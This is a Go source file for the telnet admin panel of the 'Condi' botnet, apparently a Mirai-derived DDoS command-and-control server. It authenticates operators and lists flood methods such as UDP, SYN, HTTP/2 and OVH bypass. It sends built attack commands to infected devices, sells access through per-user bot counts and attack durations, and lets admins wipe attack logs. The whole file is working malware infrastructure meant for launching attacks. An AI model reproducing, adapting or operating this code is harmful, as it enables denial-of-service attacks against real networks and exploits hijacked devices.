package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "log"
    "os"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;33mUsername\x1b[1;31m:\x1b[1;37m "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\x1b[1;33mPassword\x1b[1;31m:\x1b[1;37m "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    if len(username) > 0 && len(password) > 0 {
        log.SetFlags(log.LstdFlags)
        loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
        if err != nil {
            fmt.Println("Error: ", err)
        }
        success := "successful login"
        usernameFormat := "username:"
        passwordFormat := "password:"
        ipFormat := "ip:"
        cmdSplit := "|"  
        log.SetOutput(loginLogsOutput)
        log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
    }

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\r\x1b[1;37mБотнет Condi, высочайшее качество\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37mVer: 2.1\r\n"))
    this.conn.Write([]byte("\r\n"))
    
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d | Admin: %d | User: %d\007", BotCount, database.totalAdmins(), database.totalUsers()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d\007", BotCount))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;37m" + username + "@\x1b[1;36mCondi\x1b[1;37m# "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

        if cmd == "" {
            continue
        }

        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\r\x1b[1;37mБотнет Condi, высочайшее качество\r\n"))
    this.conn.Write([]byte("\r\x1b[1;37mVer: 2.1\r\n"))
    this.conn.Write([]byte("\r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?"  || cmd == "methods" {
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;36mudp: \x1b[1;37mudp flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36msyn: \x1b[1;37msyn flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mack: \x1b[1;37mack flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mtcp: \x1b[1;37mtcp flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36movh: \x1b[1;37movh server bypasses\r\n"))
            this.conn.Write([]byte("\x1b[1;36mpps: \x1b[1;37mhigh pps flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mbypass: \x1b[1;37mudp bypass\r\n"))
            this.conn.Write([]byte("\x1b[1;36mhandshake: \x1b[1;37mtcp handshake flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mhttp: \x1b[1;37mhttp flood\r\n"))
            this.conn.Write([]byte("\x1b[1;36mhttp2: \x1b[1;37mhttp/2 flood\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

         if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }
        
        if cmd == "ongoing" {
            this.conn.Write([]byte("┌──────────────────────────────────────────────────┐\r\n"))
            this.conn.Write([]byte("│ID            TARGET         DURATION        BOTS │\r\n"))
            this.conn.Write([]byte("└──────────────────────────────────────────────────┘\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m %d            HIDDEN            %d            %d\r\n", database.ongoingIds(), database.ongoingDuration(), database.ongoingBots())))
            continue
        }

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;37mAdmin Panel | Condi Botnet Client Managment\x1b[1;31m:\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[1;37maddnormal     \x1b[1;33m-  \x1b[1;37mADD NEW NORMAL USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37maddadmin      \x1b[1;33m-  \x1b[1;37mADD NEW ADMIN\r\n"))
            this.conn.Write([]byte("\x1b[1;37mremove        \x1b[1;33m-  \x1b[1;37mREMOVE USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37mclearlogs     \x1b[1;33m-  \x1b[1;37mREMOVE ATTACKS LOGS\r\n"))
            this.conn.Write([]byte("\x1b[1;37mbots          \x1b[1;33m-  \x1b[1;37mSHOW ALL BOTS\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if len(cmd) > 0 {
            log.SetFlags(log.LstdFlags)
            output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
            if err != nil {
                fmt.Println("Error: ", err)
            }
            usernameFormat := "username:"
            cmdFormat := "command:"
            ipFormat := "ip:"
            cmdSplit := "|" 
            log.SetOutput(output)
            log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
        }
        
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "clearlogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
        
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "addnormal" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }
        if userInfo.admin == 1 && cmd == "bots" {
        botCount = clientList.Count()
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;36mTotal botcount\x1b[1;37m: %d\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
                    } else {
                        AttackCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37mAttack has been sent to %d devices\r\n", AttackCount)))
                } else {
                    fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
